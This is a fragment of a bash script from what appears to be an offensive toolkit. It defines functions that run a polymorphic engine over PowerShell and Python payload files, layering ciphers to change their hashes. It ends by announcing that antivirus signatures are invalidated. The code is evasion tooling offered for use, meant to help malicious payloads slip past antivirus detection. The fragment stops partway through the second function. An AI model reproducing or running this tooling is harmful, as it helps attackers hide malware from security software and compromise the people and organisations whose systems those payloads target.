poly_single() {
    # poly_single <lang> <infile> [rounds]
    local LANG="$1" INFILE="$2" ROUNDS="${3:-3}"
    [ -f "$INFILE" ] || { err "File not found: $INFILE"; return 1; }

    local EXT="${INFILE##*.}"
    local OUTFILE="${INFILE%.*}_poly.$EXT"
    local HASH_BEFORE HASH_AFTER

    HASH_BEFORE=$(sha256sum "$INFILE" 2>/dev/null | cut -c1-16 || echo "????????")

    step "1" "Mutating $INFILE (lang=$LANG, rounds=$ROUNDS)..."
    python3 "$EVADE_DIR/poly_engine.py" \
        --lang    "$LANG" \
        --in      "$INFILE" \
        --out     "$OUTFILE" \
        --rounds  "$ROUNDS"

    if [ -f "$OUTFILE" ]; then
        HASH_AFTER=$(sha256sum "$OUTFILE" 2>/dev/null | cut -c1-16 || echo "????????")
        echo ""
        ok "Output: ${W}$OUTFILE${N}"
        echo -e "  ${C}SHA256 before:${N} $HASH_BEFORE"
        echo -e "  ${C}SHA256 after: ${N} $HASH_AFTER"
        echo -e "  ${C}Re-run for a new unique hash${N}"
    fi
}

poly_all() {
    banner
    echo -e "  ${W}POLY — MUTATE ALL PAYLOADS${N}\n"
    local PAYDIR="$HOME/.wizza/payloads"
    local ROUNDS="${1:-2}"

    info "Mutating all .ps1 and .py files in $PAYDIR"
    echo -e "  ${C}Rounds:${N} $ROUNDS cipher layers per file"
    echo ""

    # Print hashes before
    echo -e "  ${Y}Before:${N}"
    for f in "$PAYDIR"/*.ps1 "$PAYDIR"/*.py; do
        [ -f "$f" ] || continue
        h=$(sha256sum "$f" 2>/dev/null | cut -c1-16)
        echo -e "  ${C}$(basename "$f")${N}: $h"
    done
    echo ""

    python3 "$EVADE_DIR/poly_engine.py" --lang all --dir "$PAYDIR" --rounds "$ROUNDS"
    echo ""

    # Print hashes after
    echo -e "  ${Y}After:${N}"
    for f in "$PAYDIR"/*.ps1 "$PAYDIR"/*.py; do
        [ -f "$f" ] || continue
        h=$(sha256sum "$f" 2>/dev/null | cut -c1-16)
        echo -e "  ${C}$(basename "$f")${N}: $h  ${G}← new hash${N}"
    done
    echo ""
    ok "All payloads mutated — AV signatures invalidated"
